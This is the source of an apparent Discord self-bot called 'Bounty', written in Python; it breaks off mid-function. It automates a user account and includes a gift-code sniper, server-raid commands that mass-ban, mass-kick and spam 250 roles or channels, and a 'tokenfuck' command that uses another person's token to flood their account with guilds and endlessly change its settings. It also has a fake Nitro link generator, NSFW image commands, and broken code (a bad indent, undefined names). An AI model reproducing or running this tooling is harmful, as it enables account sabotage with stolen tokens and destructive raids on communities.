import os
import discord
from discord.ext import commands, tasks
import asyncio
import subprocess
import re, requests
import functools
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
import json
from threading import Thread
import psutil
import logging
from licensing.models import *
from licensing.methods import Key, Helpers
import smtplib
from sys import argv
import traceback
import shutil
from re import findall
import io
import sys
import aiohttp
import urllib.request
import time
import json
import base64
import numpy
import string
from time import sleep
import ctypes
import colorama
from colorama import init, Fore, Style
import datetime
import random
init()

cat = 'mode 30,7'
os.system(cat)

ctypes.windll.kernel32.SetConsoleTitleW('Logging In...')

print(f'{Fore.LIGHTBLUE_EX}[=]checking version')
time.sleep(3)
print(f'{Fore.GREEN}[+]version 1.3')
time.sleep(2)
print(f'{Fore.LIGHTBLUE_EX}[=]checking Sniper')
time.sleep(2)
print(f'{Fore.GREEN}[+]Sniper active!')
 ctypes.windll.user32.MessageBoxW(0, "Welcome to bounty", "Success", 64)


cmd = 'mode 52,16'
os.system(cmd)

ctypes.windll.kernel32.SetConsoleTitleW('Loading...')



print(f'''{Fore.RED} 
   .                                           .
  / \            ╔╗ ╔═╗╦ ╦╔╗╔╔╦╗╦ ╦           / \ 
  | |            ╠╩╗║ ║║ ║║║║ ║ ╚╦╝           | | 
  | |            ╚═╝╚═╝╚═╝╝╚╝ ╩  ╩            | |
  |.|           ┌─┐┌─┐┬  ┌─┐┌┐ ┌─┐┌┬┐         |.|
  |.|           └─┐├┤ │  ├┤ ├┴┐│ │ │          |.|
  |:|           └─┘└─┘┴─┘└  └─┘└─┘ ┴          |:|
  |:|              All Systems Go             |:|
`--8--'            All Systems Go           `--8--'  
   8               All Systems Go              8
   O                                           O
	'''+Fore.RESET)
time.sleep(6)
os.system('cls')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get("prefix")
nitro_sniper = config.get('sniper')


def Clear():
    os.system('cls')
Clear()

bot = commands.Bot(command_prefix=prefix, help_command=None, self_bot=True)


main = 'mode 58,16'
os.system(main)

ctypes.windll.kernel32.SetConsoleTitleW(f'Bounty | 1.3 | Auth: Online | BETA | prefix: {prefix}')

bot.copycat = None

def nitrosniper():
    if nitro_sniper:
        nitro = "on"
    else:
        nitro = "off"

def main():
  print(f'''{Fore.WHITE}
  ██████{Fore.RED}╗{Fore.RESET}  ██████{Fore.RED}╗{Fore.RESET} ██{Fore.RED}╗{Fore.RESET}   ██{Fore.RED}╗{Fore.RESET}███{Fore.RED}╗{Fore.RESET}   ██{Fore.RED}╗{Fore.RESET}████████{Fore.RED}╗{Fore.RESET}██{Fore.RED}╗{Fore.RESET}   ██{Fore.RED}╗{Fore.RESET}
  ██{Fore.RED}╔══{Fore.RESET}██{Fore.RED}╗{Fore.RESET}██{Fore.RED}╔═══{Fore.RESET}██{Fore.RED}╗{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}████{Fore.RED}╗{Fore.RESET}  ██{Fore.RED}║╚══{Fore.RESET}██{Fore.RED}╔══╝╚{Fore.RESET}██{Fore.RED}╗{Fore.RESET} ██{Fore.RED}╔╝{Fore.RESET}
  ██████{Fore.RED}╔╝{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}██{Fore.RED}╔{Fore.RESET}██{Fore.RED}╗{Fore.RESET} ██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}    {Fore.RED}╚{Fore.RESET}████{Fore.RED}╔╝{Fore.RESET} 
  ██{Fore.RED}╔══{Fore.RESET}██{Fore.RED}╗{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}██{Fore.RED}║╚{Fore.RESET}██{Fore.RED}╗{Fore.RESET}██{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}     {Fore.RED}╚{Fore.RESET}██{Fore.RED}╔╝{Fore.RESET}  
  ██████{Fore.RED}╔╝{Fore.RESET}{Fore.RED}╚{Fore.RESET}██████{Fore.RED}╔╝╚{Fore.RESET}██████{Fore.RED}╔╝{Fore.RESET}██{Fore.RED}║ ╚{Fore.RESET}████{Fore.RED}║{Fore.RESET}   ██{Fore.RED}║{Fore.RESET}      ██{Fore.RED}║{Fore.RESET}   
  {Fore.RED}╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
  
══════════════════════════════════════════════════════════

  '''+Fore.RESET)
main()

@bot.event
async def on_message(message):
    if bot.copycat is not None and bot.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def sniper(elapsed, code):
        print(f"{Fore.YELLOW}Server: {Fore.LIGHTCYAN_EX}[{message.guild}]" + Fore.RESET)
        print(f"{Fore.YELLOW}Time: {Fore.LIGHTCYAN_EX}[{elapsed}] Code: {Fore.LIGHTCYAN_EX}{code}" + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(f"{Fore.RED}[Someone Already Redeemed big sad :(]" + Fore.RESET)
                sniper(elapsed, code)

            elif 'subscription_plan' in r:
                ctypes.windll.user32.MessageBoxW(0, "Nitro Redeemed", "Success", 64)
                sniper(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(f"{Fore.RED}[Unknown Code]" + Fore.RESET)
                sniper(elapsed, code)
        else:
            return

    await bot.process_commands(message)

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


@bot.event
async def on_command(ctx):
  print(f"{Fore.LIGHTCYAN_EX}[Command used] | {ctx.command.name}")


@bot.command()
async def game(ctx, *, message):
  await ctx.message.delete()
  game = discord.Game(
      name=message
  )
  await bot.change_presence(activity=game)

@bot.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await bot.change_presence(
      activity=discord.Activity(
        type=discord.ActivityType.watching, 
        name=message
        ))


@bot.command()  
async def massban(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

@bot.command()
async def masskick(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@bot.command()
async def massrole(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Prime", color=RandomColor())
        except:
            return

@bot.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


@bot.command()
async def masschannel(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="Prime")
        except:
            return

@bot.command()
async def shrug(ctx):
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@bot.command()
async def lenny(ctx):
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@bot.command(aliases=["fliptable"])
async def tableflip(ctx):
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@bot.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@bot.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Bounty Was Placed",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.RED}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.RED}{e}"+Fore.RESET)
            else:
                break  

@bot.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format = format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file = discord.File(file, f"Avatar.{format}"))

@bot.command(name='8ball')
async def _ball(ctx, *, question):
    await ctx.message.delete()
    responses = [
      'Hell No',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(title="The Allmighty 8ball has decided!", color=0x8c00ff)
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://i.pinimg.com/originals/71/dc/a5/71dca57bc7cc83772022d28ea5fe17e3.jpg")
    await ctx.send(embed=embed)  

@bot.command()
async def username(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first)) 

@bot.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())

@bot.command()
async def toe(ctx):
  await ctx.message.delete()
  await ctx.send(f'data:image/jpeg;base64,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')

@bot.command()
async def embed(ctx, message, *, question):
  await ctx.message.delete( )
  embed = discord.Embed(
        color = discord.Color.blue()

    )

  embed.add_field(name=f'{message}', value=f"{question}", inline=True )
  await ctx.send(embed=embed)

@bot.command()
async def anal(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   


@bot.command()
async def feet(ctx): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def hentai(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@bot.command()
async def boobs(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def blowjob(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def lesbian(ctx):
    await ctx.message.delete()
